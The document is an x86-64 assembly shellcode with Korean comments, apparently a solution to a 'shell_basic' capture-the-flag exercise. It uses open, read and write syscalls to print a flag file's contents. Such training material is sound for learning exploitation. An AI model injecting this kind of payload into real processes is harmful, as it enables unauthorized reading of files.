section .text
global _start
_start:
    mov rax, 0x0000000000000000    ; 
    push rax
    mov rax, 0x676e6f6f6f6f6f6f    ; oooooong
    push rax
    mov rax, 0x6c5f73695f656d61    ; ame_is_l
    push rax
    mov rax, 0x6e5f67616c662f63    ; c/flag_n
    push rax
    mov rax, 0x697361625f6c6c65    ; ell_basi
    push rax
    mov rax, 0x68732f656d6f682f    ; /home/sh
    push rax
    mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
    xor rsi, rsi    ; rsi = 0 ; RD_ONLY
    xor rdx, rdx    ; rdx = 0
    mov rax, 2      ; rax = 2 ; syscall_open
    syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

    ; syscall의 반환 값은 rax로 저장됩니다.
    ; 따라서 open으로 획득한 /home/shell_basic/flag_name_is_loooooong의 fd는 rax에 저장됩니다.
    ; read의 첫 번째 인자를 이 값으로 설정해야 하므로 rax를 rdi에 대입합니다.

    mov rdi, rax      ; rdi = fd
    mov rsi, rsp
    sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
    mov rdx, 0x30     ; rdx = 0x30     ; len
    mov rax, 0x0      ; rax = 0        ; syscall_read
    syscall           ; read(fd, buf, 0x30)

    mov rdi, 1        ; rdi = 1 ; fd = stdout
    mov rax, 0x1      ; rax = 1 ; syscall_write
    syscall           ; write(fd, buf, 0x30)
